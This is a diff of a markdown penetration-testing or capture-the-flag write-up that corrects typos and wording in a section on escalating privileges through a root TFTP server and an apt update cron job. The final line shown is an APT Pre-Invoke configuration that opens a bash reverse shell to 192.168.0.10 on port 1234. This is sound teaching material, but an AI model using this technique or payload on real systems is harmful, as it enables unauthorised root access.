@@ -484,33 +484,33 @@ If we place a file in the /etc/apt/apt.conf.d/ directory, we can execute Pre/Pos
 Continuing the search of the /etc directory on FTP, we find the default configuration file for a tftp sever. 
 
 ```
-cat /192.168.0.1/etcdefault/tftpd-hpa
+cat /192.168.0.1/etc/default/tftpd-hpa
 ```
 
 ![image](tftp-config.png)
 
-The server is running as root as root and is hosting the / filesystem. Tftp does not have any security or authentication, so let's try and write to the target at 192.168.0.1. We will try to write to /home and confirm the existence of the file by connecting to ftp.
+The server is running as root and is hosting the / filesystem. Tftp does not have any security or authentication, so let's try and write to the target at 192.168.0.1. We will try to write to /home and confirm the existence of the file by connecting to ftp.
 
 Create a file named test.txt, then connect to the target via tftp. Write the file to /home/, exit tftp and logging to ftp and confirm that test.txt was written to /home/
 
 ![image](tftp-confirm.png)
 
 
-## Privilege Escalation On COntainer Host
+## Privilege Escalation On Container Host
 
 We have write access to the / file system via the tftp misconfiguration, we also know that apt update is running as a cron job every 5 minutes. 
 
-With the information about 'APT::Update::Pre-Invoke' and our write access, we can create a file inside /etc/apt/apt.conf.d/. The contents of the file will execute our chosen command prior to apt update being executed.
+With the information about 'APT::Update::Pre-Invoke' and our write access via tftp, we can create a file inside /etc/apt/apt.conf.d/. The contents of the file will execute our chosen command prior to apt update being executed.
 
 ### Putting it all together
 
-We will create a file named 'exploit' and enter the following configuration into it. 
+We will create a file named 'exploit' and enter a configuration into it. 
 
 ```
 vim exploit
 ```
 
-The configuration will execute a bash reverse shell to the container on port 1234. We use this port as we know it will be accessible.
+The configuration will execute a bash reverse shell to the container (192.168.0.10) on port 1234. We will use this port as we know it will be accessible.
 
 ```
 APT::Update::Pre-Invoke {"/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.10/1234 0>&1'"}
